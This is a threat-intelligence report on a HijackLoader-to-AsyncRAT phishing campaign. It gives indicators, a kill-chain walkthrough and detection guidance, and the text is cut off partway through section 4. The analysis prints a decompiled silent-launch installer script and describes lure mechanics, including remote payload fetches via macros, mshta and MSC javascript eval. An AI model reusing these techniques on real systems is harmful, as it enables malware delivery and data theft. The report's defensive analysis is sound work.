---
title: "HijackLoader / Penguish / Rugmi to AsyncRAT Multi-Vector Phishing Campaign"
date: '2026-05-06'
layout: post
permalink: /reports/opendirectory-62-60-237-100-20260506/
hide: true
category: "MaaS Operation"
description: "A Russian-speaking commodity-malware operator runs a live 15-month multi-vector phishing campaign delivering HijackLoader / Penguish / Rugmi into an AsyncRAT-class .NET RAT, staged from OFAC-sanctioned AS210644 infrastructure and beaconing to Spamhaus DROP-listed AS210558."
detection_page: /hunting-detections/opendirectory-62-60-237-100-20260506-detections/
ioc_feed: /ioc-feeds/opendirectory-62-60-237-100-20260506-iocs.json
detection_sections:
  - label: "Detection Coverage Summary"
    anchor: "#detection-coverage-summary"
  - label: "YARA Rules"
    anchor: "#yara-rules"
  - label: "Sigma Rules"
    anchor: "#sigma-rules"
  - label: "Suricata Signatures"
    anchor: "#suricata-signatures"
  - label: "Coverage Gaps"
    anchor: "#coverage-gaps"
ioc_highlights:
  - value: "185[.]241[.]208[.]129"
    note: "C2 server (AS210558 1337 Services, Spamhaus DROP)"
  - value: "62[.]60[.]237[.]100"
    note: "Staging server (AS210644 AEZA, OFAC SDN)"
  - value: "07af4aa9e4d215a5ee63f9a0a277fbe3"
    note: "JA3 fingerprint (Abuse.ch SSLBL — AsyncRAT)"
  - value: "1afbe5d960af45832539b11e92a09b808f0c3868ab437a7ef1b5d1bd5e16d0c3"
    note: "Carriers.exe — primary SFX wrapper (SHA256)"
  - value: "68fb61225b457172368d43af7ec2afe48f59404089d095584944edbfd0171feb"
    note: "pe_03 — HijackLoader proper (SHA256)"
---

**Campaign Identifier:** HijackLoader-Penguish-MultiVector-62.60.237.100<br>
**Last Updated:** May 6, 2026<br>
**Threat Level:** HIGH

## BLUF / Bottom Line Up Front

A live, 15-month-old multi-vector phishing campaign on OFAC-sanctioned bulletproof infrastructure (`62.60.237[.]100`, AS210644 AEZA, Finland) delivers a HijackLoader / Penguish / Rugmi loader chain that ends in an AsyncRAT-class .NET RAT beaconing to `185.241.208[.]129:56167` on Spamhaus DROP-listed AS210558 (1337 Services, Poland). The campaign is tracked here as **UTA-2026-007** (an internal Hunters Ledger designation — see Section 11). Threat level is **HIGH** (overall risk score 7.5/10) — the multiplicity of evasion layers (multi-vendor camouflage bundle, hostname-keyed per-host KDF, renamed signed Qihoo binary as .NET injection host, legacy `.job` autorunsc blind spot) compresses time-to-detect from sample launch to first C2 beacon to ~43 seconds. The single highest-value durable defender signal is the **JA3 hash `07af4aa9e4d215a5ee63f9a0a277fbe3`** — it fingerprints the malware's TLS client behavior independently of the C2 IP and rotating-IP infrastructure cannot defeat it. Attribution to a publicly named threat group rests at LOW confidence (58%); Russian-speaking operator language attribution is HIGH confidence (90%).

---

## 1. Executive Summary

A Russian-speaking commodity-malware operator, tracked here as **UTA-2026-007** *(an internal tracking label used by The Hunters Ledger — see Section 11)*, runs an end-to-end multi-vector phishing-to-RAT campaign that delivers a HijackLoader / Penguish / Rugmi loader chain into a .NET AsyncRAT-class final stealer. This report byte-confirms the full chain — Inno Setup dropper with Pascal-script anti-triage, LZNT1-chunked encrypted payload, eight embedded PE files, a multi-vendor camouflage bundle, and hollowing into a renamed signed third-party vendor binary (genuine Qihoo 360 PromoUtil dropped as `WVault.exe`) for .NET injection — all with PCAP, EVTX, memory forensics tool (Volatility), and Process Explorer evidence in one corpus. The campaign is live (DEFINITE — three independent network capture sources confirm active C2) and the operator's choice of OFAC-sanctioned plus Spamhaus DROP-listed dual-bulletproof hosting indicates a high risk-tolerance profile (HIGH confidence, per Section 8).

**Why this report exists:** existing public reporting on HijackLoader / Penguish / Rugmi and on AsyncRAT-class downstream payloads covers the individual stages of this kill chain in isolation. No public report links the full chain — Inno Setup `InitializeSetup() returns False` distribution stealth, multi-vendor genuine-binary co-location, the cross-campaign "renamed-Qihoo-PromoUtil hollow host" TTP cluster, and the per-host hostname-keyed KDF that resisted ~270 cryptographic recovery combinations — to the same campaign with end-to-end byte confirmation. This report fills that gap.

**What was found.** A 32+ artifact open directory at `62.60.237[.]100/Documents/` (AEZA Finland, AS210644, **OFAC-sanctioned**) hosting a complete multi-vector phishing kit. Eight parallel execution primitives — `.url` Internet Shortcuts, `.lnk` shortcuts, `.scr`/`.msi` files with Right-to-Left Override (RTLO) disguise, macro Office documents, `.xll` Excel add-ins, MSC files using the GrimResource technique, HTA/MHT/MHTML proof-of-concept artifacts, and SFX installers — all converge on the same loader chain. The final stage beacons over TLSv1 to `185.241.208[.]129:56167` (1337 Services GmbH, Poland, AS210558, **Spamhaus DROP-listed**). Three independent VirusTotal IDS rules confirm the family is AsyncRAT-class. Campaign infrastructure has been live for 15+ months (first observed 2025-02-08; investigation date 2026-05-06).

**Key Takeaways.**

- **JA3 hash `07af4aa9e4d215a5ee63f9a0a277fbe3` is the single highest-value durable detection signal in this campaign.** It fingerprints the malware's TLS client behavior independently of the C2 IP — IP rotation cannot defeat JA3 detection. Block at network perimeter immediately.
- **DNS-based detection (RPZ, sinkholes, DGA detection) WILL NOT catch this campaign.** The C2 IP `185.241.208.129` is hardcoded in the loader/payload and never queried via DNS (49 DNS queries observed in the run, none point to operator infrastructure). Detection must be IP-based, JA3-based, or behavioral.
- **Persistence uses legacy `.job` format that the standard Sysinternals autorunsc tool does NOT enumerate by default.** Defenders relying solely on autorunsc inventory will miss this. Hunt for `*.job` file creation in `C:\Windows\Tasks\` from non-system-installer parents OR enumerate `C:\Windows\System32\Tasks\watchermgmt` directly.
- **The renamed-Qihoo-PromoUtil hollow-host pattern reuses across 8+ campaigns since 2025** — defenders should detect the PATTERN (orphaned `WVault.exe` or any renamed `PromoUtil.exe` with `clr.dll!CreateAssemblyNameObject` thread start addresses) rather than specific hashes. The hash rotates per campaign; the pattern is durable.
- **Time-to-detect window is ~43 seconds from sample launch to first C2 beacon.** File-based blocking must act inside this window OR behavioral detection at the orphan-`WVault.exe` stage is required. SIEM/EDR latency over ~60 seconds is too slow for prevention; only detection-and-response is feasible.
- **The operator demonstrates "selective sophistication"** — high-tier work in chosen areas (multi-vendor camouflage, three-layer wrapping, per-host KDF, cross-campaign hollow-host TTP) and commodity choices in others (near-stock Inno Setup wrapper, commodity HijackLoader, commodity Rugmi.HP cert installer). This is more diagnostic than uniform high-tier work — the profile is a MaaS-customer + bundle-camouflage integrator, NOT a custom-RAT or loader developer.
- **Attribution to a publicly named actor rests at LOW confidence (58%).** TAG-150 / GrayBravo and TA544 / Narwhal Spider are both ruled out at INSUFFICIENT confidence; Russian-speaking operator language attribution is HIGH confidence (90%); cross-vector operator-fingerprint cluster is MODERATE confidence (75%) for distinct-operator. Treat UTA-2026-007 as a tracking label, not a public actor identity.

**Key Risk Factors.**

<table>
<colgroup>
<col style="width: 26%;">
<col style="width: 16%;">
<col style="width: 58%;">
</colgroup>
<thead>
<tr><th>Risk Dimension</th><th>Score (X/10)</th><th>Rationale</th></tr>
</thead>
<tbody>
<tr><td>Data Exfiltration</td><td>8/10</td><td>AsyncRAT-class .NET RAT supports browser credentials, banking sessions (HTTPS MITM via GoProxy CA), keystrokes, screenshots; full filesystem access</td></tr>
<tr><td>System Compromise</td><td>8/10</td><td>Remote command execution, scheduled task persistence with HighestAvailable privileges, .NET assembly injection in signed-vendor host</td></tr>
<tr><td>Persistence Difficulty</td><td>7/10</td><td>Legacy <code>.job</code> is autorunsc blind spot; Defender exclusion of drop directory; operator IPC via Wondershare-named pipe</td></tr>
<tr><td>Evasion Capability</td><td>9/10</td><td>Multi-layer wrapping; per-host KDF; multi-vendor camouflage; renamed signed binary as injection host; hardcoded-IP C2 (DNS blocking ineffective); Heaven's Gate in pe_03</td></tr>
<tr><td>Lateral Movement</td><td>5/10</td><td>No automated lateral movement (not a worm); manual lateral movement via stolen credentials possible</td></tr>
<tr><td>Detection Difficulty</td><td>8/10</td><td>DNS-based detection ineffective (no DNS resolution for C2); TLS-fingerprint and behavioral process-tree are the primary durable signals (Section 6.7)</td></tr>
</tbody>
</table>

**Overall Risk Score: 7.5/10 (HIGH).** Detection is feasible — the durable signals listed in Key Takeaways above (TLS fingerprint, persistence file pattern, hollow-host process tree) provide multiple non-overlapping options, and the full detection package is in Section 10. The risk is the multiplicity of evasion layers and the operator's selective sophistication: high-tier work in chosen areas (camouflage, KDF, hollow host) and commodity choices elsewhere (Inno Setup wrapper, commodity loader). This is a MaaS-customer + bundle-camouflage integrator profile, not a script kiddie.

**Threat Actor.** **UTA-2026-007** — tracked at three confidence levels (full assessment in Section 11):
- **Russian-speaking operator: HIGH confidence (90%)** — `VSEZBSRABOTAT.url` filename, Russian-language Kraken-exchange URL on second-stage IP, `busket/` Mega.io subdir typo (English-second-language tell), and SPecialiST RePack YARA hit on `NDA.doc`
- **Distinct operator (not coincidental shared bulletproof tenancy): MODERATE confidence (75%)** — four cross-vector fingerprints stable across 15+ months and seven delivery vectors
- **Publicly named actor link: LOW confidence (58%)** — TAG-150 / GrayBravo and TA544 / Narwhal Spider both ruled out at INSUFFICIENT confidence; treat UTA-2026-007 as a tracking label, not a public actor identity

**For technical teams (operational hooks complementing the Key Takeaways above):**
- Hunt for any `*.job` file creation in `C:\Windows\Tasks\` from non-system-installer parents — the legacy `.job` format is an autorunsc enumeration blind spot and is the campaign's primary persistence mechanism (Section 6.4).
- Investigate any orphaned `WVault.exe` or `PromoUtil.exe` with `clr.dll!CreateAssemblyNameObject` thread start addresses + outbound TLSv1 traffic on non-standard high ports — this catches the cross-campaign hollow-host TTP cluster (Section 6.3).
- Detection content (six YARA rules, eight Sigma rules, four Suricata signatures) is published separately at `/hunting-detections/opendirectory-62-60-237-100-20260506-detections/` (raw file: `opendirectory-62-60-237-100-20260506-detections.md`).

The remainder of this report walks the kill chain end-to-end (Section 3), documents the static and dynamic technical analysis (Sections 4–6), maps observed behaviors to MITRE ATT&CK (Section 7), summarizes the threat-actor assessment and the UTA-2026-007 designation (Section 11), and closes with the consolidated Detection & Response section (Section 10) and gap-and-assumption catalog (Section 15).

### 1.1 Threat Intelligence Summary

This report is anchored to a single observable corpus rather than to general threat-landscape commentary, but four threat-intel facts shape how defenders should treat the findings:

- **Family identification at HIGH confidence (92%)** — Kaspersky `Trojan.Win32.Penguish.gun`, Microsoft `TrojanDownloader:Win64/Rugmi.HNL!MTB`, and Elastic Security's `Windows_Trojan_GhostPulse_caea316b` YARA all converge on the same loader family. HijackLoader / Penguish / Rugmi / GhostPulse / IDAT Loader / SHADOWLADDER are aliases for one commodity loader tracked by six vendors since July 2023 (see Section 2 for the full timeline).
- **Final-stage class at HIGH confidence (88%)** — three independent VirusTotal IDS rules fire on the C2 SSL handshake (AsyncRAT/zgRAT SSL cert, DCRat C&C SSL cert, AsyncRAT JA3). Combined with `clr.dll!CreateAssemblyNameObject` thread start addresses in `WVault.exe`, the final stage is .NET AsyncRAT-class. Specific variant (AsyncRAT vs DCRat vs zgRAT vs heavily modified fork) is INSUFFICIENT — requires TLS MITM or memory dump.
- **Infrastructure has dual-BPH posture** — AS210644 (AEZA) was OFAC-sanctioned in July 2025 with Five Eyes joint advisory; AS210558 (1337 Services) is Spamhaus DROP-listed. The operator stages on both with full awareness — the Stage 1 sample first appeared on VirusTotal eight months after AS210644 was sanctioned. This rules out cautious or low-skill operators (HIGH confidence) and is a strong signal of risk tolerance.
- **Cross-campaign reuse at HIGH confidence** — VirusTotal `execution_parents` pivot identifies the renamed-Qihoo-PromoUtil-as-`WVault.exe` injection host pattern across 8+ distinct campaigns since 2025. Defenders detecting the PATTERN (orphaned legitimate Qihoo binary with .NET CLR thread start addresses) generalize across the cluster — not bound to specific hashes that the operator can rotate.

Public reporting matches and gaps are inventoried in Section 2.2; the threat-actor assessment with full ACH alternatives is in Section 11.

---

## 2. Threat Intelligence Summary — HijackLoader Family Background and Evolution

The primary loader family in this campaign is HijackLoader, a modular commodity loader that is tracked under at least six aliases across vendor reporting:

| Alias | Vendor | First documented |
|---|---|---|
| HijackLoader | Zscaler ThreatLabz | September 2023 |
| GhostPulse | Elastic Security Labs | October 2023 |
| Rugmi | ESET Research | December 2023 |
| Penguish | Kaspersky Securelist | January 2024 |
| IDAT Loader | Kroll Cyber | July 2024 |
| SHADOWLADDER | Red Canary | (telemetry-based) |

The Stage 1 sample analyzed in this corpus carries Kaspersky's `Trojan.Win32.Penguish.gun` verdict, Microsoft's `TrojanDownloader:Win64/Rugmi.HNL!MTB` label on the embedded loader binary, and Elastic Security's `Windows_Trojan_GhostPulse_caea316b` YARA hit — three independent vendor classifications that anchor the family identification at HIGH confidence (92%).

### 2.1 Family evolution timeline

The loader has evolved measurably between 2023 and 2026. Key milestones from public reporting:

| Date | Event | Source |
|---|---|---|
| 2023-07 | First in-the-wild observation | Zscaler ThreatLabz |
| 2023-09 | First technical analysis published — modular architecture, six injection variants documented | Zscaler ThreatLabz |
| 2023-10 | First GhostPulse analysis — IDAT chunk steganography, process doppelgänging | Elastic Security Labs |
| 2023-12 | ESET reports detection surge from single-digit to hundreds per day | ESET Research |
| 2024-01 | Kaspersky names Penguish family + ScarletStealer chain | Kaspersky Securelist |
| 2024-02 | Heaven's Gate technique (32↔64 bit mode switch) disclosed in HijackLoader chains | CrowdStrike |
| 2024-05 | Process hollowing + UAC bypass added; new modules `modUAC`, `WDDATA`, `modCreateProcess`, `modWriteFile` | Trellix Research |
| 2024-06 | GrimResource MSC technique disclosed | Elastic Security Labs |
| 2024-07 | IDATLOADER documented delivering AsyncRAT, PureStealer, Remcos, StealC, Lumma, Carbanak | Kroll Cyber |
| 2024-10 | Code-signing certificate abuse detected; signed-EXE shift documented (5 abused certificate authorities) | HarfangLab |
| 2024-10 | Pixel-based GhostPulse evolution replaces IDAT chunk parsing | Elastic Security Labs |
| 2025-03 | ANTIVM module + call-stack spoofing analysis published | Zscaler ThreatLabz |
| 2025-04 | TAG-150 / GrayBravo cluster (Recorded Future) uses HijackLoader as secondary delivery | Recorded Future |
| 2025-07-01 | US Treasury OFAC sanctions Aeza Group (AS210644), the bulletproof hosting provider for many HijackLoader-adjacent campaigns | US Treasury OFAC |
| 2025-07-15 | "Unmasking AsyncRAT" fork taxonomy published (DcRat / VenomRAT / SilverRAT / 40+ forks) | ESET Research |
| 2025-12-21 | Open directory at `62.60.237[.]100/Documents/` first observed active | Self-observed |
| 2026-03-22 | Stage 1 sample (`Carriers.exe`) first seen on VirusTotal | Self-observed via VT |
| 2026-05-06 | This investigation; campaign infrastructure all live | Self-observed |

### 2.2 Public reporting matches and gaps

> **Analyst note:** This subsection lists what already exists in public reporting versus what is novel or under-documented in this campaign. The point is not to claim everything in this report is brand new — most of the techniques have been documented in pieces. The point is that the byte-confirmed, end-to-end chain in one corpus surfaces several details that defenders cannot get from existing public reporting.

**Strong matches with public reporting (HIGH confidence):**
- LZNT1-chunked PNG-IDAT-framed payload structure (Elastic Security 2023; Zscaler 2024)
- Stage-2 position-independent shellcode with PEB-walk API hash resolution (Zscaler 2024; Bahlai Medium)
- GrimResource MSC weaponization (Elastic Security June 2024)
- TLSv1 hardcoded-IP C2 on non-standard high port (multiple AsyncRAT variant reports)
- Legacy `.job` legacy scheduled task as autorunsc blind spot (Microsoft documentation)
- Defender exclusion add via `MsMpEng.exe` (Microsoft Threat Intelligence)
- Code-signing certificate abuse (HarfangLab October 2024)
- Final-stage AsyncRAT-class with multiple AsyncRAT/DcRAT IDS rule hits (Abuse.ch SSLBL)
- Mega.io payload staging (general — multiple commodity-operator reports)

**Novel or under-documented in public reporting (HIGH confidence):**
- Stage-2 XOR key `0xE1D5B4A2` differs from canonical published `32 A3 49 B3` — fork-specific build evidence
- Pascal-script `InitializeSetup() returns False` orphan-and-execute trick — documented only in fragments
- Inno Setup 6.5+ format gap as deliberate evasion (`innounp 0.50` and `innoextract 1.9` fail to parse)
- Multi-vendor genuine signed-binary co-location (four genuine vendor binaries, not one) — camouflage upgrade beyond HarfangLab single-binary signing
- Whole-binary hollowing of renamed signed third-party EXE (Qihoo `PromoUtil.exe` → `WVault.exe`)
- Hostname-keyed dual-use crypto pattern — used as both PRNG seed AND decryption key
- GoProxy MITM CA cert install with thumbprint `0174E68C97DDF1E0EEEA415EA336A163D2B61AFD` as a HijackLoader operator artifact — no prior HijackLoader documentation
- `WondershareCrashServices` named pipe used as covert IPC channel (Wondershare Breakpad usage is legitimate; abuse is novel)
- Operator-rebuilt Wondershare crash reporter with PDB path `I:\CompanySource\Plowshare\Src\Symbol\Release\ExceptionHandler.pdb`
- Cross-campaign `WVault.exe` hollow-host pattern — used by 8+ campaigns since 2025
- RTLO + Cyrillic-codepoint URL substitution layered (`%e2%80%ae` + `%d1%80`)
- `.xll` Excel-DNA delivery in a HijackLoader chain (XLL is usually paired with non-modular loaders — Dridex, Agent Tesla, Buer)
- Mega.io `busket/` typo subdir — operator fingerprint stable across all delivery vectors for 15+ months

---

## 3. Kill Chain Overview

> **Analyst note:** This section walks the kill chain end-to-end at a high level so the rest of the report has a shared map. Each stage gets a plain-language description of what happens, who triggers it, and what the defender should look for. Sections 4 through 6 then go deep on each technical layer. If you only read one technical section, read this one — it gives you the shape of the campaign at one glance.

The campaign is a multi-vector phishing kit converging on a single loader chain. The user opens any of eight different lure types. Each vector unpacks to the same downstream — a HijackLoader / Penguish / Rugmi loader chain that drops a renamed signed Qihoo binary, hollows it, and injects a .NET RAT. The infographic below shows the full chain for the primary sample (`Carriers.exe`); the other seven vectors join the chain at Stage 1 (the SFX installer phase).

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-kill-chain-overview.svg" | relative_url }}" alt="Vertical flowchart of the 11-stage HijackLoader / Penguish / Rugmi to AsyncRAT-class kill chain. Stages flow top-to-bottom with arrows. Stage 0 (orange) Initial Access, 8 parallel delivery vectors (.url, .lnk, .scr/.msi RTLO, macro Office, .xll, .msc GrimResource, .hta/.mht/.mhtml POCs, fake-PDF .exe). Stage 1 (amber) SFX Wrapper Carriers.exe Inno Setup 6.5+, Pascal Script InitializeSetup -> WinExec -> return False with silent installer abort. Stage 2 (red) Side-load Host CrystSupervisor32.exe (renamed Wondershare SlideShowEditor.exe) loads operator-modified ExceptionHandler.dll with Plowshare PDB and inline reflective loader. Stage 3 (purple) First DLL Hollow into Windows tapisrv.dll, reads shadermgr93.rc 27 KB config, copies 5808 bytes of stage-2 shellcode. Stage 4 (red) Stage-2 Shellcode 5808 bytes 8-phase architecture, X65599 hash table, anti-sandbox quadruple, reads networkspec17.log 2.6 MB and decodes through PNG-IDAT chunk walker, 4-byte XOR with key 0xE1D5B4A2, LZNT1 chunked to 3.75 MB. Stage 5 (purple) Second DLL Hollow into Windows input.dll. Stage 6 (cyan) Stage-3 PE Bundle 8 PEs split into 5 genuine signed binaries (Crisp Squirrel, Info-ZIP, two Google Updater PEs, Qihoo 360 PromoUtil) and 3 operator PEs (pe_03 HijackLoader proper, pe_06 GoProxy MITM CA installer, pe_07 bundle-cleanup helper). Stage 7 (red) Per-host KDF via ntdll!RtlHashUnicodeString, seed = X65599(GetComputerNameW()) XOR 0xa1b2d3b4 used as both PRNG seed and decryption key, resisted ~270 cipher recovery attempts. Stage 8 (purple) WVault.exe Hollow, genuine Qihoo PromoUtil dropped to C:\\ProgramData\\WVault.exe with parent process orphaned, .NET CLR thread start addresses visible (clr.dll!CreateAssemblyNameObject, GetIdentityAuthority). Cross-campaign TTP across 8+ campaigns since 2025. Stage 9 (dark red) Persistence + Defender Bypass + GoProxy CA cert install at thumbprint 0174E68C97DDF1E0EEEA415EA336A163D2B61AFD. Stage 10 (dark red) C2 Beacon TLSv1 to 185.241.208[.]129:56167 (hardcoded IP, no DNS), JA3 07af4aa9e4d215a5ee63f9a0a277fbe3 matches SSLBL AsyncRAT JA3, JA4 t10i060500_4dc025c38c38_1a3805c3aa63, ClientHello cipher list 49162-49161-49172-49171-53-47. Footer: total time from sample launch to first C2 beacon approximately 43 seconds, file-based blocking must act inside this window or behavioral detection at Stage 8 is required.">
  <figcaption><em>Figure 1: HijackLoader / Penguish / Rugmi → AsyncRAT-class kill chain. The 11 stages flow from the eight initial-access lures down to the C2 beacon at the bottom. Color coding (mapped to the site's severity palette where applicable): <span style="color:#f97316">orange</span> initial access · <span style="color:#eab308">yellow</span> dropper · <span style="color:#dc2626">red</span> operator loader · <span style="color:#58a6ff">blue</span> hollowed Windows DLL · <span style="color:#a855f7">purple</span> PE bundle (mixed legit and malicious) · <span style="color:#7f1d1d">deep red</span> persistence and C2. Sample-launch to first C2 beacon ≈ 43 seconds — file-based blocking must act inside this window, otherwise behavioral detection at the orphan-<code>WVault.exe</code> stage is required. Sections 4–6 walk each stage in technical depth.</em></figcaption>
</figure>

**Stage-by-stage detail at a glance:**

| Stage | What happens | What defenders see |
|---|---|---|
| 0 | 8 parallel lures (URL/LNK/SCR/MSI-RTLO/macro-Office/XLL/MSC/HTA/fake-PDF-EXE) | First-touch artifact in the inbox or downloads — variable per vector |
| 1 | `Carriers.exe` Inno Setup 6.5+ wrapper · Pascal Script `InitializeSetup() → WinExec → return False` | Silent installer that "fails to install" while payload is already running |
| 2 | `CrystSupervisor32.exe` (genuine signed Wondershare) loads operator-modified `ExceptionHandler.dll` with Plowshare PDB | DLL side-load from a non-Wondershare installation directory |
| 3 | First DLL hollow into `tapisrv.dll` (5,808 bytes of stage-2 shellcode) | RWX section in `tapisrv.dll` of `CrystSupervisor32.exe` |
| 4 | Stage-2 shellcode 8-phase: API hash table, anti-sandbox quadruple, IDAT/XOR/LZNT1 decode of `networkspec17.log` to 3.75 MB | `ZwDelayExecution` × 9 · large LZNT1 decompression on a `.log` file |
| 5 | Second DLL hollow into `input.dll` with stage-3 PE bundle | RWX section in `input.dll` |
| 6 | 8 PEs unpacked (5 genuine signed binaries as camouflage + 3 operator-controlled including HijackLoader proper) | Multi-vendor file drop in `%TEMP%\is-XXXXX.tmp\` |
| 7 | pe_03 resolves `RtlHashUnicodeString` and derives per-host KDF (`X65599(hostname) XOR 0xa1b2d3b4`) · 4 random env vars created | Per-host random uppercase-A-Z env-var names · encrypted `*.tmp` files |
| 8 | `WVault.exe` (renamed Qihoo PromoUtil) spawned then orphaned · .NET CLR thread start addresses visible | Orphaned signed Qihoo binary in `C:\ProgramData\` with `clr.dll!CreateAssemblyNameObject` thread |
| 9 | Three persistence layers: legacy `.job` scheduled task · Defender exclusion of drop dir · GoProxy CA cert install | `.job` file in `C:\Windows\Tasks\` (autorunsc blind spot) · cert thumbprint `0174E68C…2B61AFD` in registry |
| 10 | TLSv1 beacon to `185.241.208[.]129:56167` · hardcoded IP · JA3 `07af4aa9…fbe3` matches SSLBL AsyncRAT | Outbound TLSv1 to non-standard high port from orphaned signed Qihoo binary · DNS-based detection useless |

**Total time from sample launch to first C2 beacon: ~43 seconds.** File-based blocking needs to act in this window, or behavioral detection is required.

### 3.1 The eight delivery vectors

> **Analyst note:** All eight vectors converge on the same loader chain — the operator picks whichever one fits the victim's mail-gateway and EDR posture. A defender who blocks only one vector still misses the campaign.

The open directory hosts a complete multi-vector phishing kit. Every vector below was observed in the corpus and is detailed in Section 4.

| Vector | Files in kit | Mechanism |
|---|---|---|
| `.url` Internet Shortcut | `VSEZBSRABOTAT.url`, `NDA_Verification222.url`, `Price.pdf.url`, `2.url` | `URL=file:///\\<typosquat>\…` triggers WebDAV/SMB → potential NTLM hash leak + WebDAV fetch |
| `.lnk` shortcut | `sss.lnk`, `xxx.lnk`, `13223.lnk` | LNK target = `explorer.exe` + UNC argument padded with ~232 spaces (anti-inspection) |
| Macro Office docs | `Price5.docm`, `Price6.doc`, `NDA.doc`, `Price4.xls` | Reverse-encoded URL → `iwr` → Mega.io payload → `start-process %TEMP%\application.exe` |
| Macro-security disable | `Excel_2016_Windows.bat` | PowerShell sets `Office\1[6,9].0\*\Security\VBAWarnings=1` |
| RTLO disguise | `puttyfdp.scr`, `NDA_Agreementsfdp.msi`, `Carriers_Agreements_009RCARHEFfd..scr` | U+202E flips display so `.scr`/`.msi` reads as `.PDF`; new variant adds Cyrillic-р homoglyph |
| Fake-PDF `.exe` | `NDA_Agreements.PDF_2025-12-22 06-50-31-659.exe`, `PriceList.PDF_*.exe` | Long-timestamp filename pushes `.exe` extension off Explorer's column |
| MSC GrimResource | `1.msc`, `Price2.pdf.msc`, `MSCFile.msc` | `res://apds.dll/redirect.html?target=javascript:eval(…)` — XSL → VBScript → PowerShell |
| HTA / MHT / MHTML POCs | `hta.hta`, `mht.mht`, `mhtml.mhtml` | `mshta.exe \\<host>\file.hta` from network (operator dev artifacts with Russian comments) |
| `.xll` Excel-DNA add-in | `Price3.xll` (3.4 MB, `init.dll,#1` rundll32 entry), `Macros64_2_.xll` | Excel add-ins as macro-block bypass |
| SFX installers | `Carriers.exe`, `LDKPOIZD.exe`, `MWXTCKDB.exe`, `VFSZQPTV.exe`, `PPMANLYP.exe`, `anvirrus.exe`, `NDA_Agreements.PDF_*.exe`, `PriceList.PDF_*.exe` | WiX Burn (LDKPOIZD), Inno Setup (Carriers), 7-Zip SFX (PPMANLYP), Embarcadero Delphi |
| Bundled accessory | `AnyDesk.exe`, `processhacker-2.39-setup.exe`, `putty.exe`/`PUTTY.exe`, `KMSAuto Net.exe` | Standard Russian-affiliate accessory toolkit (RMM + LOLBins) |

### 3.2 Lure themes

Two dominant lure themes appear:

- **NDA-themed:** `NDA_Agreements.PDF_*.exe`, `NDA_Verification222.url`, `NDA2026.zip → NDA.zip → NDA.doc`, `NDA_Agreementsfdp.msi` (RTLO variant). Targets sales, legal, and procurement workflows.
- **Price/Carrier-shipping themed:** `PriceList.PDF_*.exe`, `Price.zip` / `price2026.zip`, `Price[3,4,5,6]` doc/xll/xls/docm, `Carriers.exe`, `Price2.pdf.msc`. Targets transport, carriers, and sales workflows.

Both themes target B2B business workflows — consistent with broad opportunistic commodity-operator playbooks. No specific industry has been narrowly targeted.

---

## 4. Static Analysis — Distribution Layer

The distribution-layer analysis covers the outermost wrapper a defender first encounters in a triage pipeline (`Carriers.exe`), the side-load host that runs after silent extraction (`CrystSupervisor32.exe`), and the operator's modified DLL that drives the loader chain (`ExceptionHandler.dll`). Each is analyzed below.

### 4.1 Carriers.exe — Inno Setup Pascal-Script Anti-Triage Wrapper

**File facts:**

| Field | Value |
|---|---|
| Filename | `Carriers.exe` |
| Original URL | `hxxp://62.60.237[.]100:80/Documents/Carriers.exe` |
| Size | 6,592,496 bytes (6.3 MB) |
| SHA256 (prefix) | `1afbe5d9…` (full hash, MD5, IMPHASH in IOC feed) |
| Compile timestamp | 2025-09-11 13:05:07 UTC |
| Compiler / linker | Embarcadero Delphi (Turbo Linker) — Inno Setup 6.5+ wrapper |
| Overlay | 5,639,664 bytes (5.4 MB embedded Inno bundle) |
| VT detection | 36/76 |
| Inno Setup `AppName` | `Apophyge` (operator codename — architectural term) |
| Inno Setup `DefaultDirName` | `Veteran` (operator codename) |
| Inno Setup `AppId` GUID | `{1F2952E4-FC07-4482-B9E6-E795507DA7D2}` (campaign-unique) |

> Hash and full IOC details — see `opendirectory-62-60-237-100-20260506-iocs.json` companion file (referenced in Section 14). All file-fact tables in Sections 4.7–4.10 follow the same convention: SHA256 prefixes are shown for orientation; full hashes and additional indicators are in the IOC feed, not embedded inline.

`Carriers.exe` is a near-stock Inno Setup 6.5+ wrapper, NOT the operator's malicious heavy-lifter. The operator's only modifications are at three places: the Pascal Script `[Code]` section, the bundle contents, and the disguise (`Apophyge` `AppName`, `Veteran` `DefaultDirName`). The cryptographic primitives — ChaCha20, SHA-512, BLAKE2 — that show up in YARA hits are all stock Inno Setup 6.3+ ChaCha20 stack components, not operator code.

#### 4.1.1 Pascal Script `InitializeSetup() returns False` distribution stealth

> **Analyst note:** Inno Setup is a legitimate open-source installer — most installers you've ever clicked were probably built with it. Operators sometimes embed a small script inside an Inno Setup wrapper. This particular operator uses a script trick that makes the installer fire off the payload then abort silently with no wizard ever appearing on screen. Sandboxes that wait for a wizard or for the Run section of the installer to execute see nothing happen — they don't know the payload already ran. This is the single most important reason this campaign passes through automated triage pipelines that would catch a more conventional dropper.

**Pascal Script bytecode** (decompiled from `CompiledCode.bin` via Inno Setup bytecode decompiler (`ifpsdasm`), 1,632 bytes):

```
InitializeSetup() :
begin
    tmp := ExpandConstant('{tmp}')          // %TEMP%\is-XXXXX.tmp\
    ExtractTemporaryFile x 17               // drops camouflage DLLs + payload
    cmdline := '"' + tmp + '\CrystSupervisor32.exe' + '"'
    WinExec(cmdline, SW_NORMAL)             // fire-and-forget launch
    Result := False                         // installer aborts silently
end
```

**Effect of `Result := False`:** the installer exits immediately. No wizard window, no `[Files]` extraction phase via the standard path, no `[Run]` section, no progress dialog. The victim sees nothing. The payload (`CrystSupervisor32.exe`) is already running because `WinExec` is fire-and-forget — control returns to the Pascal Script before `CrystSupervisor32.exe` finishes initializing.

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-pascal-script-initializesetup.png" | relative_url }}" alt="Inno Setup Pascal Script bytecode disassembly showing the InitializeSetup() function: a series of PushType statements followed by ExtractTemporaryFile calls for each Wondershare camouflage DLL (BugSplat.dll, COMSupport.dll, CrystSupervisor32.exe, DBGHelp.dll, DVDSetting.dll, ExceptionHandler.dll, networkspec17.log, NLEResource.dll, NLEService.dll, NLETransitionMgr.dll, SlideShowEditor.ini, WSUtilities.dll, WS_ImageProc.dll, WS_Log.dll, WsBurn.dll), then a CallExternal to WinExec, ending with PushBool and an early return.">
